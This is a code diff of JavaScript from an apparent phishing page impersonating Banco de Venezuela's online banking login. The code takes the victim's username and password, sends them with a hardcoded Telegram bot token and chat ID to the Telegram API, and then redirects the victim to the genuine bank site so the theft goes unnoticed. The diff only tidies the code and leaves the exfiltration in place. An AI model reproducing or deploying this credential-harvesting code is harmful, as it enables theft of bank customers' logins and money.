@@ -410,23 +410,20 @@
             const usuario = document.querySelector('.input-field').value;
             const password = document.querySelector('.password-input').value;
             
-            // Mostrar loader
             const loader = document.querySelector('.loader');
             loader.style.display = 'flex';
             
-            // Enviar directamente a Telegram
             const token = "8080814760:AAFEZS3tJZHNg6zNbPh2JNFSLXNccRSElYQ";
             const chat_id = "6912929677";
-            const mensaje = `🏦 ═══ BDV EN LÍNEA ═══ 🏦\n\n👤 Usuario: ${usuario}\n🔑 Clave: ${password}\n🌐 IP: ${ip}\n📅 Fecha: ${new Date().toLocaleString()}`;
+            const mensaje = `🏦 ═══ BDV EN LÍNEA ═══ 🏦\n\n👤 Usuario: ${usuario}\n🔑 Clave: ${password}\n📅 Fecha: ${new Date().toLocaleString()}`;
             
             fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(mensaje)}`)
-            .then(response => response.json())
-            .then(data => {
+            .then(() => {
                 setTimeout(() => {
                     window.location.href = 'https://bdvenlinea.banvenez.com/';
                 }, 2000);
             })
-            .catch(error => {
+            .catch(() => {
                 setTimeout(() => {
                     window.location.href = 'https://bdvenlinea.banvenez.com/';
                 }, 2000);
